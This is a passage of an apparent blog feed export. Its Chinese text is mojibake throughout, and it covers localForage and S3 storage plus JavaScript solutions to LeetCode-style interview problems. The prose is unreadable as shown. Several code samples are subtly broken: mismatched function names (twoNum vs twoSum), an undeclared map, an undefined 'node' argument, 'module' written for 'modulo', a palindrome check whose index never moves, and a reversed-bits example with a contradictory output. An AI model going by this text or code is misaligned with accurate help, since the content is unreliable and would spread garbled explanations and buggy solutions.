ä¸ºè¦åœ¨ç½‘ç»œä¸Šä¼ è¾“æ•°æ®è€Œå¼€é”€çš„æ—¶é—´ã€‚ Web å­˜å‚¨ç¡®å®žä¼šå—åˆ°é™åˆ¶ï¼Œä½†åªè¦ä½¿ç”¨å®ƒå¾—å½“ã€‚ä¾ç„¶æ˜¯ç®€å•è€Œä¸”å¼ºå¤§çš„å·¥å…·ã€‚ localForageWeb å­˜å‚¨çš„ä¸»è¦ç¼ºç‚¹ä¸»æ˜¯å®ƒçš„é˜»å¡žå¼åŒæ­¥ API å’ŒæŸäº›æµè§ˆå™¨ä¸­æœ‰é™çš„å­˜å‚¨ç©ºé—´ã€‚é™¤äº† Web å­˜å‚¨ï¼Œå¤§å¤šæ•°æµè§ˆå™¨éƒ½æ”¯æŒ WebSQL æˆ–è€…æ˜¯ IndexedDBï¼Œæˆ–è€…åŒæ—¶æ”¯æŒä¸¤ç§å­˜å‚¨ã€‚å®ƒä»¬éƒ½æ˜¯éžé˜»å¡žï¼Œå¹¶ä¸”å­˜å‚¨ç©ºé—´æ¯” Web çš„å¤§ã€‚ ä½†æ˜¯ä¸å»ºè®®ç”¨ Web å­˜å‚¨ç›´æŽ¥ç”¨ã€‚WebSQL å·²ç»è¢«åºŸå¼ƒäº†ï¼Œå®ƒçš„ç»§ä»»è€…æ˜¯ IndexedDB,æä¾›çš„ API å³ä¸å‹å¥½ï¼Œä¹Ÿä¸ç®€æ´ã€‚è¦æƒ³åœ¨æµè§ˆå™¨ä¸­ç”¨éžé˜»å¡žçš„æ–¹å¼å­˜å‚¨æ•°æ®ï¼Œå¯ä»¥ç”¨ä¸€ç§æ ‡å‡†åŒ–çš„éžæ ‡é…å·¥å…·ï¼Œå…¶ä¸­æ¥è‡ª Mozilla çš„ localForage åº“ã€‚ API æ¦‚è§ˆï¼š localForage çš„æŽ¥å£åŸºæœ¬ä¸Šä¸Ž Web å­˜å‚¨æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡æ˜¯å¼‚æ­¥éžé˜»å¡žæ–¹å¼çš„ï¼š localforage.setItem(key,value,callback)â€”â€”å­˜å‚¨é”®å€¼å¯¹ localforage.getItem(key,callback)â€”â€”èŽ·å–æŒ‡å®šçš„é”®çš„å€¼ localforage.removeItem(key,callback)â€”â€”ç§»é™¤æŒ‡å®šé”®çš„å€¼ localforage.clear(callback)â€”â€”ç§»é™¤æ‰€æœ‰çš„é”®å€¼å¯¹ localforage.key(index,callback)â€”â€”èŽ·å–æŒ‡å®šç´¢å¼•çš„å€¼ localforage.keys(callback)â€”â€”èŽ·å–æ‰€æœ‰çš„é”® localforage.iterate(iterate,callback)â€”â€”å¾ªçŽ¯éåŽ†é”®å€¼å¯¹ è¯»å’Œå†™localForage API ä¸­æœ‰ promise å’Œå›žè°ƒä¸¤ç§æ–¹å¼ã€‚ localStorage å’Œ localForage çš„æ•°æ®è¯»å– 12345678910111213// localStorage åŒæ­¥é˜»å¡žconst value = localStorage.getItem(key);console.log(value);// localforage ä½¿ç”¨ promise çš„å¼‚æ­¥éžé˜»å¡žæ–¹å¼localforage.getItem(key) .then(value =&gt; console.log(value));// ä½¿ç”¨å›žè°ƒçš„å¼‚æ­¥éžé˜»å¡žçš„æ–¹å¼localforage.getItem(key, (err, value) =&gt; &#123; console.log(value);&#125;); localForage ä¼šåœ¨åº•å±‚ä½¿ç”¨å½“å‰æµè§ˆå™¨çŽ¯å¢ƒä¸­æœ€å¥½çš„å­˜å‚¨æœºåˆ¶ã€‚å¦‚æžœæœ‰ IndexedDB,å°±ä½¿ç”¨å®ƒã€‚å¦åˆ™å°±å°è¯• WebSQL,æŽ¥ç€å°±æ˜¯ Web å­˜å‚¨ã€‚è¿™äº›å­˜å‚¨çš„ä¼˜å…ˆçº§æ˜¯å¯ä»¥é…ç½®çš„ï¼Œè®¾ç½®æ˜¯å¯ä»¥ç¦æ­¢ä½¿ç”¨æŸç§å­˜å‚¨ï¼š 12// ä¸ç”¨ localStoragelocalforage.setDriver([localforage.INDEXEDDB, localforage.WEBSQL]); localForage å¯ä»¥å­˜å‚¨å­—ç¬¦ä¸²ä¹‹å¤–çš„å…¶ä»–ç±»åž‹çš„æ•°æ®ã€‚å®ƒæ”¯æŒå¤§å¤šæ•°çš„ JS åŽŸå§‹ç±»åž‹ï¼Œæ¯”å¦‚æ•°ç»„æˆ–è€…æ˜¯å¯¹è±¡ï¼Œä»¥åŠäºŒè¿›åˆ¶æ•°æ®ç±»åž‹ï¼šTypeArrayã€ArrayBufferå’Œ Blob ã€‚IndexedDBæ˜¯å”¯ä¸€æ”¯æŒäºŒè¿›åˆ¶æ•°æ®å­˜å‚¨çš„åŽå°ï¼Œä¹Ÿå°±æ˜¯è¯´åŽå°ç”¨çš„æ˜¯ WebSQL å’Œ localStorage ï¼Œä¼šæœ‰ç¼–ç»„å¼€é”€ï¼š 12345Promise.all([ localforage.setItem('number', 3), localforage.setItem('object', &#123; key: 'value' &#125;), localforage.setItem('typedArray', new Uint32Array([1, 2, 3]))]) å°† API åšæˆè·Ÿ Web å­˜å‚¨ä¸€æ ·è®© localForage ç”¨èµ·æ¥ä¹Ÿç®€å•ï¼Œä¹Ÿè§£å†³äº†å¾ˆå¤šç¼ºç‚¹å’Œå…¼å®¹æ€§é—®é¢˜ã€‚ å­˜å‚¨æ‰˜ç®¡ä½¿ç”¨å­˜å‚¨æ‰˜ç®¡ä¸éœ€è¦ç®¡ç†è‡ªå·±çš„æœåŠ¡å™¨ç«¯å­˜å‚¨ï¼Œå¯ä»¥è¿…é€Ÿå°è¯•æ‰€æœ‰å·¥å…·ï¼Œç”šè‡³æ— éœ€è‡ªå·±æ­å»ºè‡ªå·±çš„æ•°æ®åº“ä¸»æœºå°±èƒ½éƒ¨ç½²å¯¹å¤–å¼€æ”¾çš„ç”Ÿæˆç¨‹åºã€‚ä½†éƒ¨ç½²è‡ªå·±çš„æ•°æ®å­˜å‚¨è¶Šæ¥è¶Šç®€å•ï¼Œå¾ˆå¤šäº‘æœåŠ¡æä¾›å•†éƒ½æœ‰é¢„å…ˆé…ç½®å¥½çš„æœåŠ¡å™¨æ˜ åƒï¼Œå®‰è£…äº†è¿è¡Œæ‰€é€‰æ•°æ®åº“æ‰€éœ€çš„å…¨éƒ¨è½¯ä»¶ï¼Œå¹¶ä¸”å…¨éƒ½é…ç½®å¥½äº†ã€‚ ç®€å•å­˜å‚¨æœåŠ¡Amazon çš„ç®€å•å­˜å‚¨æœåŠ¡ï¼ˆS3ï¼‰æ˜¯ä¸€ç§è¿œç¨‹æ–‡ä»¶æ‰˜ç®¡æœåŠ¡ï¼ŒåŒ…å«åœ¨å¤§å—æ¬¢è¿Žçš„ ASW åŒ…ä¸­ï¼Œç”¨ S3å­˜å‚¨å’Œæ‰˜ç®¡å¼€æ”¾çš„æ–‡ä»¶æœ‰æˆæœ¬ä¸Šçš„ä¼˜åŠ¿ã€‚å®ƒæ˜¯äº‘ç«¯çš„æ–‡ä»¶ç³»ç»Ÿã€‚å¯ä»¥ç”¨ RESTful HTTP è°ƒç”¨å°†æ–‡ä»¶å’Œä¸è¶…è¿‡ 2KBçš„å…ƒæ•°æ®ä¸Šä¼ åˆ°æ¡¶ä¸­ã€‚ç„¶åŽé€šè¿‡ HTTP GET æˆ– BitTorrent åè®®è®¿é—®è¿™äº›å†…å®¹ã€‚ æˆ‘ä»¬å¯ä»¥å¯¹æ¡¶ä¸­åŠå…¶ä¸­çš„å†…å®¹è¿›è¡Œå„ç§è®¿é—®è®¸å¯é…ç½®ï¼ŒåŒ…æ‹¬åŸºäºŽæ—¶é—´çš„è®¿é—®ã€‚è¿˜å¯ä»¥ç»™æ¡¶é‡Œçš„å†…å®¹æŒ‡å®šä¸€ä¸ªç”Ÿå­˜æœŸï¼ˆTTLï¼‰ï¼Œç”Ÿå­˜æœŸè¿‡åŽä¼šä»Žæ¡¶ä¸­åˆ é™¤ï¼Œå†ä¹Ÿè®¿é—®ä¸åˆ°ã€‚å°† S3 æ•°æ®æå‡åˆ°å†…å®¹äº¤ä»˜ç½‘ç»œï¼ˆCDNï¼‰ä¸­ä¹Ÿå¾ˆå®¹æ˜“ã€‚AWS æä¾›äº† CloudFront CDN,å¯ä»¥è½»æ¾é“¾æŽ¥åˆ°ä½ çš„æ–‡ä»¶ï¼Œç„¶åŽç”¨å¾ˆä½Žçš„å»¶æ—¶æä¾›ç»™å…¨ä¸–ç•Œã€‚ S3 å¯ä»¥å­˜å‚¨ä»»ä½•æ–‡ä»¶ï¼Œåªè¦ä¸è¶…è¿‡ 5TBï¼Œä»»ä½•æ ¼å¼éƒ½å¯ä»¥ã€‚åœ¨å¤„ç†è¦ä½œä¸ºä¸€ä¸ªæ•´ä½“æ¥è®¿é—®çš„ã€ä¸æ€Žä¹ˆå˜åŒ–çš„å¤§å—æ•°æ®æ—¶ï¼ŒS3 çš„è¡¨çŽ°æœ€å¥½ã€‚ æ€»ç»“ Node æ—¢èƒ½ç”¨å…³ç³»åž‹æ•°æ®åº“ï¼Œä¹Ÿèƒ½ç”¨ NoSQL æ•°æ®åº“ ç®€å•çš„ pg æ¨¡å—å¾ˆæ“…é•¿å¤„ç† SQL è¯­è¨€ Knex æ¨¡å—å¯ä»¥ä½¿ç”¨å‡ ä¸ªæ•°æ®åº“ ACID æ˜¯ä¸€ç»„æ•°æ®åº“äº‹åŠ¡å±žæ€§ï¼Œä¹Ÿå¯ä»¥ä¿è¯å®‰å…¨æ€§ MongoDB æ˜¯ä½¿ç”¨ JavaScript çš„ NoSQL æ•°æ®åº“ Redis æ˜¯å¯ä»¥å½“åšæ•°æ®åº“å’Œç¼“å­˜ç”¨çš„æ•°æ®ç»“æž„åŒ–å­˜å‚¨ LevelDB æ˜¯æºè‡ª Google é«˜é€Ÿé”®/å€¼å¯¹å­˜å‚¨ï¼Œå¯ä»¥å°†å­—ç¬¦ä¸²æ˜ å°„åˆ°å€¼ LevelDB æ˜¯æ¨¡å—åŒ–æ•°æ®åº“ åŸºäºŽ Web çš„å­˜å‚¨ï¼ŒåŒ…æ‹¬ LocalForage å’Œ localStorge ï¼Œå¯ä»¥å°†æ•°æ®ä¿å­˜åœ¨æµè§ˆå™¨ä¸­ï¼Œ å¯ä»¥ç”¨ Amazon S3 è¿™æ ·çš„å­˜å‚¨æœåŠ¡æŠŠæ•°æ®ä¿å­˜åˆ°äº‘æä¾›å•†é‚£é‡Œ]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯é¢è¯•é¢˜ç›®æ±‡æ€»æ‘˜å½•ï¼ˆJS ç¼–ç¨‹ç¯‡ï¼‰]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E7%BC%96%E7%A8%8B%E7%AF%87.html</url>
    <content type="text"><![CDATA[æ¸©æ•…è€ŒçŸ¥æ–°ï¼Œä¿æŒç©ºæ¯å¿ƒæ€.leetCode é¢˜ç›®æ•´ç†ã€‚ JS ç¼–ç¨‹é¢˜éš¾åº¦ï¼šç®€å•ä¸¤æ•°ä¹‹å’Œç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œ ä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œæ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶è¿”å›žä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆï¼Œä½†æ˜¯ï¼Œä¸èƒ½é‡å¤åˆ©ç”¨è¿™ä¸ªæ•°ç»„ä¸­ç›¸åŒçš„å…ƒç´ ã€‚ 1234567891011121314151617181920212223242526// æœ€ç¬¨çš„è§£æ³•/*** @param &#123;number[]&#125; nums* @param &#123;number&#125; target* @param &#123;number[]&#125;*/var twoNum = function(nums,target)&#123; for(let i=0;i&lt;nums.length;i++)&#123; for(let j=0;j&lt;nums.length;j++)&#123; if(i !== j &amp;&amp; nums[i] + nums[j] === target)&#123; return [i,j] &#125; &#125; &#125;&#125;// å…¶ä»–è§£æ³•mapvar twoNum = function(nums,target)&#123; for(let i=0;i&lt;nums.length;i++)&#123; if(map.has(target-nums[i]))&#123; return [map.get(target-nums[i]),i] &#125; map.set(nums[i],i) &#125;&#125;twoSum([3,2,4],6)// [1,2] ä¸¤æ•°ä¹‹å’Œ-è¾“å‡ºæœ‰åºæ•°ç»„ç»™å®šä¸€ä¸ªå·²æŒ‰ç…§å‡åºæŽ’åˆ—çš„æœ‰åºæ•°ç»„ï¼Œæ‰¾å‡ºä¸¤ä¸ªæ•°ä½¿å¾—å®ƒä»¬ç›¸åŠ ä¹‹å’Œç­‰äºŽç›®æ ‡æ•°ã€‚ å‡½æ•°åº”è¯¥è¿”å›žè¿™ä¸¤ä¸‹æ ‡å¿— index1 å’Œ index2ï¼Œå…¶ä¸­ index1å¿…é¡»å°äºŽ index2 1234567891011121314151617181920212223242526272829/** * @param &#123;number[]&#125; numbers * @param &#123;number&#125; target * @return &#123;number[]&#125; */var twoNum = function(numbers,target)&#123; let map = new Map(); for(let i=0;i&lt;numbers.length;i++)&#123; if(map.has(target-numbers[i]))&#123; return [map.get(target-numbers[i]),i+1] &#125; map.set(numbers[i],i+1) &#125;&#125;// åŒæŒ‡é’ˆvar twoNum = function(numbers,target)&#123; var left = 0, right=numbers.length-1; while(left &lt; right)&#123; if(numbers[left]+numbers[right] === target)&#123; return [left+1,right+1] &#125;else if(numbers[left]+numbers[right]&lt;target)&#123; left++; &#125;else&#123; right--; &#125; &#125;&#125; ä¸¤æ•°ä¹‹å’Œ-è¾“å…¥ BSTç»™å®šä¸€ä¸ªäºŒå‰æ ‘å’Œä¸€ä¸ªç›®æ ‡ç»“æžœï¼Œå¦‚æžœ BST ä¸­å­˜åœ¨ä¸¤ä¸ªå…ƒç´ ä¸”å®ƒä»¬çš„å’Œä¸€ä¸ªç›®æ ‡ç»“æžœï¼Œå¦‚æžœ BST ä¸­å­˜åœ¨ä¸¤ä¸ªå…ƒç´ ä¸”å®ƒä»¬çš„å’Œç­‰äºŽç»™å®šçš„ç›®æ ‡ç»“æžœï¼Œåˆ™è¿”å›ž true 12345678910111213141516171819202122232425262728/** * Definition for a binary tree node. * function TreeNode(val) &#123; * this.val = val; * this.left = this.right = null; * &#125; *//** * @param &#123;TreeNode&#125; root * @param &#123;number&#125; k * @return &#123;boolean&#125; */var findTarget = function(root,k)&#123; let array = []; dfs(node,array); let map = new Map(); for(let i=0;i&lt;array.length;i++)&#123; if(map.has(k-array[i])) return true map.set(array[i],i) &#125; return false&#125;function dfs(node,array)&#123; if(!node) return; dfs(node.right,array); array.push(node.val); dfs(node.left,array)&#125; æ•´æ•°åè½¬ç»™å‡ºä¸€ä¸ª32ä½æœ‰ç¬¦å·æ•´æ•°ï¼Œéœ€è¦å°†è¿™ä¸ªæ•´æ•°ä¸­æ¯ä½çš„æ•°å­—è¿›è¡Œåè½¬ æ³¨æ„: å‡è®¾æˆ‘ä»¬çš„çŽ¯å¢ƒåªèƒ½å­˜å‚¨å¾—ä¸‹ 32 ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼Œåˆ™å…¶æ•°å€¼èŒƒå›´ä¸º [âˆ’231, 231 âˆ’ 1]ã€‚è¯·æ ¹æ®è¿™ä¸ªå‡è®¾ï¼Œå¦‚æžœåè½¬åŽæ•´æ•°æº¢å‡ºé‚£ä¹ˆå°±è¿”å›ž 0ã€‚ 1234567891011121314151617181920212223// è¾“å…¥ï¼š123// è¾“å‡ºï¼š321// è¾“å…¥ï¼š-123// è¾“å‡ºï¼š-321// è¾“å…¥ï¼š120// è¾“å‡ºï¼š21/*** @param &#123;number&#125; x* @return &#123;number&#125;*/var reverse = function(x)&#123; const MAX_VALUE = Math.pow(2,31) - 1; const MIN_VALUE = Math.pow(-2,31); let sum = 0; while(x)&#123; sum = sum * 10 + x % 10; x = x / 10 &gt;&gt; 0 &#125; if(sum &lt; MAX_VALUE &amp;&amp; sum &gt; MIN_VALUE)&#123; return sum &#125; return 0;&#125; &gt;&gt;0 ä¸Ž &gt;&gt;&gt;0ï¼šå‰è€…æ˜¯æœ‰ç¬¦å·å³ç§»ï¼ŒåŽè€…æ˜¯æ— ç¬¦å· ç§»ä½æ“ä½œç¬¦åœ¨ç§»ä½å‰åšäº†ä¸¤ç§è½¬æ¢ï¼Œç¬¬ä¸€å°†ä¸æ˜¯ number ç±»åž‹çš„æ•°æ®è½¬æ¢æˆ numberï¼Œç¬¬äºŒå°† number è½¬æ¢æˆæ— ç¬¦å·çš„ 32bitæ•°æ®ï¼Œä¹Ÿå°±æ˜¯ Uint32ç±»åž‹ã€‚è¿™äº›ä¸Žç§»ä½çš„ä½æ•°æ— å…³ï¼Œç§»ä½ 0 ä½ ä¸»è¦å°±æ˜¯ç”¨äº† js çš„å†…éƒ¨ç‰¹æ€§åšäº†å‰ä¸¤ç§çš„è½¬æ¢ã€‚ Unit32ç±»åž‹æ˜¯å¦‚ä½•è½¬æ¢çš„ï¼š å¦‚æžœä¸èƒ½è½¬æ¢ä¸º Numberï¼Œé‚£å°±æ˜¯ä¸º 0 å¦‚æžœä¸ºéžæ•´æ•°ï¼Œå…ˆè½¬æ¢æˆä¸ºæ•´æ•° å¦‚æžœæ˜¯æ­£æ•°ï¼Œå°±è¿”å›žæ­£æ•°ï¼Œå¦‚æžœæ˜¯è´Ÿæ•°ï¼Œå°±è¿”å›žè´Ÿæ•° +2 çš„ 32æ¬¡æ–¹ 12345678910function ToInteger(x)&#123; x = Number(x); return x &lt; 0 ? Math.ceil(x) : Math.floor(x)&#125;function modulo(a,b)&#123; return a - Math.floor(a/b) * b&#125;function ToUnit32(x)&#123; return module(ToInteger(x),Math.pow(2,32))&#125; é¢ å€’äºŒè¿›åˆ¶é¢ å€’ç»™å®šçš„ 32 ä½æ— ç¬¦å·æ•´æ•°çš„äºŒè¿›åˆ¶ä½ 1234567891011121314151617/**è¾“å…¥: 00000010100101000001111010011100è¾“å‡º: 00111001011110000010100101000000è§£é‡Š: è¾“å…¥çš„äºŒè¿›åˆ¶ä¸² 00000010100101000001111010011100 è¡¨ç¤ºæ— ç¬¦å·æ•´æ•° 43261596ï¼Œ å› æ­¤è¿”å›ž 964176192ï¼Œå…¶äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ä¸º 00111001011110000010100101000000ã€‚ *//**è¾“å…¥ï¼š11111111111111111111111111111101è¾“å‡ºï¼š10111111111111111111111111111111è§£é‡Šï¼šè¾“å…¥çš„äºŒè¿›åˆ¶ä¸² 11111111111111111111111111111101 è¡¨ç¤ºæ— ç¬¦å·æ•´æ•° 4294967293ï¼Œ å› æ­¤è¿”å›ž 3221225471 å…¶äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ä¸º 10101111110010110010011101101001ã€‚ *//*** @param &#123;numebr&#125; n - a positive integer* @param &#123;return&#125; n - a positive integer*/var reverseBits = function(n)&#123; return Number.parseInt([...n.toString(2)].reverse().join('').padEnd(32,'0'),2)&#125; padEndã€padStart ES2017å¼•å…¥äº†å­—ç¬¦ä¸²ä¸å…¨é•¿åº¦çš„åŠŸèƒ½ï¼Œå¦‚æžœæŸä¸ªå­—ç¬¦ä¸²ä¸å¤ŸæŒ‡å®šé•¿åº¦ï¼Œä¼šåœ¨å¤´éƒ¨æˆ–è€…å°¾éƒ¨è¡¥å…¨ã€‚ 1234567891011121314'x'.padStart(4,'ab'); // abax'x'.padStart(5,'ab'); // ababx'x'.padEnd(4,'ab'); // xaba'x'.padEnd(5,'ab'); // xabab// å¦‚æžœåŽŸå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç­‰äºŽæˆ–è€…å¤§äºŽæŒ‡å®šçš„æœ€å°é•¿åº¦ï¼Œåˆ™è¿”å›žåŽŸå­—ç¬¦ä¸²//å¸¸è§ç”¨é€”// ä¸ºæ•°å€¼è¡¥å…¨æŒ‡å®šä½æ•°'1'.padStart(10,'0'); // 000000001'12'.padStart(10,'0'); // 000000012// æç¤ºå­—ç¬¦ä¸²æ ¼å¼'12'.padEnd(10,'YYYY-MM-DD') // 'YYYY-MM-DD''09-12'.padStart(10,'YYYY-MM-DD'); // 'YYYY-09-12' å›žæ–‡æ•°åˆ¤æ–­ä¸€ä¸ªæ•´æ•°æ˜¯å¦æ˜¯å›žæ–‡æ•°ã€‚å›žæ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»Žå·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»Žå³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•° 123456789101112131415161718192021222324252627282930313233/*** @param &#123;number&#125; x* return &#123;boolean&#125;*/// æœ€ç¬¨çš„æ–¹æ³•var isPalindrome = function(x)&#123; let str = x.toString(); let len = str.length; let j = len - 1; for(let i=0;i&lt;len;i++)&#123; if(str[i] !== str[j])&#123; return false &#125; &#125; return true;&#125;// ä¹¦å†™ç®€å•ä½†æ˜¯é€Ÿåº¦æ…¢var isPalindrome = function(x)&#123; return x == x.toString().split('').reverse().join('') &#125;// ä¸è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œç”¨åŽŸæ¥çš„æ•°å­—è§£var isPalindrome = function(x) &#123; let original = x ; let result = 0; while(x)&#123; result = result * 10 + x % 10; x = x /10 &gt;&gt; 0 &#125; return original === result&#125;; å”¯ä¸€çš„æ‘©å°”æ–¯å¯†ç é™…æ‘©å°”æ–¯å¯†ç å®šä¹‰ä¸€ç§æ ‡å‡†ç¼–ç æ–¹å¼ï¼Œå°†æ¯ä¸ªå­—æ¯å¯¹åº”äºŽä¸€ä¸ªç”±ä¸€ç³»åˆ—ç‚¹å’ŒçŸ­çº¿ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œ æ¯”å¦‚: â€œaâ€ å¯¹åº” â€œ.-â€œ, â€œbâ€ å¯¹åº” â€œ-â€¦â€, â€œcâ€ å¯¹åº” â€œ-.-.â€, ç­‰ç­‰ã€‚ ä¸ºäº†æ–¹ä¾¿ï¼Œæ‰€æœ‰26ä¸ªè‹±æ–‡å­—æ¯å¯¹åº”æ‘©å°”æ–¯å¯†ç è¡¨å¦‚ä¸‹ï¼š 1[&quot;.-&quot;,&quot;-...&quot;,&quot;-.-.&quot;,&quot;-..&quot;,&quot;.&quot;,&quot;..-.&quot;,&quot;--.&quot;,&quot;....&quot;,&quot;..&quot;,&quot;.---&quot;,&quot;-.-&quot;,&quot;.-..&quot;,&quot;--&quot;,&quot;-.&quot;,&quot;---&quot;,&quot;.--.&quot;,&quot;--.-&quot;,&quot;.-.&quot;,&quot;...&quot;,&quot;-&quot;,&quot;..-&quot;,&quot;...-&quot;,&quot;.--&quot;,&quot;-..-&quot;,&quot;-.--&quot;,&quot;--..&quot;] ç»™å®šä¸€ä¸ªå•è¯åˆ—è¡¨ï¼Œæ¯ä¸ªå•è¯å¯ä»¥å†™æˆæ¯ä¸ªå­—æ¯å¯¹åº”æ‘©å°”æ–¯å¯†ç çš„ç»„åˆã€‚ä¾‹å¦‚ï¼Œâ€cabâ€ å¯ä»¥å†™æˆ â€œ-.-..â€“â€¦â€ï¼Œ(å³ â€œ-.-.â€ + â€œ-â€¦â€ + â€œ.-â€œå­—ç¬¦ä¸²çš„ç»“åˆ)ã€‚æˆ‘ä»¬å°†è¿™æ ·ä¸€ä¸ªè¿žæŽ¥è¿‡ç¨‹ç§°ä½œå•è¯ç¿»è¯‘ã€‚ è¿”å›žæˆ‘ä»¬å¯ä»¥èŽ·å¾—æ‰€æœ‰è¯ä¸åŒå•è¯ç¿»è¯‘çš„æ•°é‡ã€‚ ä¾‹å¦‚: 1234567891011// è¾“å…¥: words = ["gin", "zen", "gig", "msg"]//è¾“å‡º: 2// è§£é‡Š: // å„å•è¯ç¿»è¯‘å¦‚ä¸‹:"gin" -&gt; "--...-.""zen" -&gt; "--...-.""gig" -&gt; "--...--.""msg" -&gt; "--...--." å…±æœ‰ 2 ç§ä¸åŒç¿»è¯‘, â€œâ€“â€¦-.â€ å’Œ â€œâ€“â€¦â€“.â€. æ³¨æ„: å•è¯åˆ—è¡¨words çš„é•¿åº¦ä¸ä¼šè¶…è¿‡ 100ã€‚ æ¯ä¸ªå•è¯ words[i]çš„é•¿åº¦èŒƒå›´ä¸º [1, 12]ã€‚ æ¯ä¸ªå•è¯ words[i]åªåŒ…å«å°å†™å­—æ¯ã€‚ è§£é¢˜æ€è·¯ï¼š å¾ªçŽ¯éåŽ†èŽ·å–å•æ¬¡åˆ—è¡¨ä¸­æ¯ä¸ªå•è¯çš„ Unicode ç¼–ç ï¼Œå·²çŸ¥æ‰€æœ‰çš„å•è¯éƒ½æ˜¯å°å†™å­—æ¯ï¼Œç„¶åŽ 97~122æ˜¯26ä¸ªå°å†™å­—æ¯çš„ç¼–ç ï¼Œå‡åŽ» 97 åŽå¯ä»¥å¯¹åº”å¯†ç è¡¨çš„ç´¢å¼•ã€‚å–å‡ºæ¯ä¸ªå•è¯çš„å¯†ç ç›¸äº’æ¯”è¾ƒï¼Œå¾—å‡ºæ‰€æœ‰è¯ä¸åŒå•è¯çš„é•¿åº¦ã€‚ 123456789101112131415161718const code = [".-","-...","-.-.","-..",".","..-.","--.","....","..",".---","-.-",".-..","--","-.","---",".--.","--.-",".-.","...","-","..-","...-",".--","-..-","-.--","--.."];/** *@params &#123;string[]&#125; words *@return &#123;number&#125; */ const words = ["gin", "zen", "gig", "msg"]; var uniqueMorseRepresentations = function(words)&#123; const len = words.length; for(let i = 0;i &lt; len;i++)&#123; let str = ''; for(let j = 0; j &lt; words[i].length; j++)&#123; str +=code[words[i][j].charCodeAt()-97]; &#125; words[i] = str &#125; return [...new Set(words)].length; &#125; uniqueMorseRepresentations(words); å®çŸ³ä¸ŽçŸ³å¤´ç»™å®šå­—ç¬¦ä¸²J ä»£è¡¨çŸ³å¤´ä¸­å®çŸ³çš„ç±»åž‹ï¼Œå’Œå­—ç¬¦ä¸² Sä»£è¡¨ä½ æ‹¥æœ‰çš„çŸ³å¤´ã€‚ S ä¸­æ¯ä¸ªå­—ç¬¦ä»£è¡¨äº†ä¸€ç§ä½ æ‹¥æœ‰çš„çŸ³å¤´çš„ç±»åž‹ï¼Œä½ æƒ³çŸ¥é“ä½ æ‹¥æœ‰çš„çŸ³å¤´ä¸­æœ‰å¤šå°‘æ˜¯å®çŸ³ã€‚ J ä¸­çš„å­—æ¯ä¸é‡å¤ï¼ŒJ å’Œ Sä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯ã€‚å­—æ¯åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤&quot;a&quot;å’Œ&quot;A&quot;æ˜¯ä¸åŒç±»åž‹çš„çŸ³å¤´ã€‚ ç¤ºä¾‹ 1: 12è¾“å…¥: J = &quot;aA&quot;, S = &quot;aAAbbbb&quot;è¾“å‡º: 3 ç¤ºä¾‹ 2: 12è¾“å…¥: J = &quot;z&quot;, S = &quot;ZZ&quot;è¾“å‡º: 0 æ³¨æ„: S å’Œ J æœ€å¤šå«æœ‰50ä¸ªå­—æ¯ã€‚ J ä¸­çš„å­—ç¬¦ä¸é‡å¤ã€‚ è§£é¢˜æ€è·¯ï¼š éåŽ†èŽ·å–çŸ³å¤´ Sä¸­æ¯ä¸ªå­—æ¯ï¼Œç”¨ matchå‡½æ•°å¯¹ J è¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸè®¡æ•°åŠ 1ã€‚ match: 1234567/** searchvalue å¿…éœ€ã€‚è§„å®šè¦æ£€ç´¢çš„å­—ç¬¦ä¸²å€¼ã€‚ regexp å¿…éœ€ã€‚è§„å®šè¦åŒ¹é…çš„æ¨¡å¼çš„ RegExp å¯¹è±¡ã€‚å¦‚æžœè¯¥å‚æ•°ä¸æ˜¯ RegExp å¯¹è±¡ï¼Œåˆ™éœ€è¦é¦–å…ˆæŠŠå®ƒä¼ é€’ç»™ RegExp æž„é€ å‡½æ•°ï¼Œå°†å…¶è½¬æ¢ä¸º RegExp å¯¹è±¡ã€‚ è¿”å›žå€¼ å­˜æ”¾åŒ¹é…ç»“æžœçš„æ•°ç»„ã€‚è¯¥æ•°ç»„çš„å†…å®¹ä¾èµ–äºŽ regexp æ˜¯å¦å…·æœ‰å…¨å±€æ ‡å¿— gã€‚*/stringObject.match(searchvalue)stringObject.match(regexp) 1234567891011121314151617/*** @param &#123;string&#125; J* @param &#123;string&#125; K* @return &#123;number&#125; */var J = "aA", S = "aAAbbbb";var numJewelsInStones = function(J,S)&#123; let count = 0; for(let i = 0; i &lt; S.length; i++)&#123; if(J.match(S.charAt(i))&#123; count++; &#125;; &#125; return count;&#125;numJewelsInStones(J,S); æŒ‰å¥‡å¶æŽ’åºæ•°ç»„ç»™å®šä¸€ä¸ªéžè´Ÿæ•´æ•°æ•°ç»„ Aï¼Œè¿”å›žä¸€ä¸ªç”± A çš„æ‰€æœ‰å¶æ•°å…ƒç´ ç»„æˆçš„æ•°ç»„ï¼ŒåŽé¢è·Ÿ A çš„æ‰€æœ‰å¥‡æ•°å…ƒç´ ã€‚ ä½ å¯ä»¥è¿”å›žæ»¡è¶³æ­¤æ¡ä»¶çš„ä»»ä½•æ•°ç»„ä½œä¸ºç­”æ¡ˆã€‚ ç¤ºä¾‹ï¼š 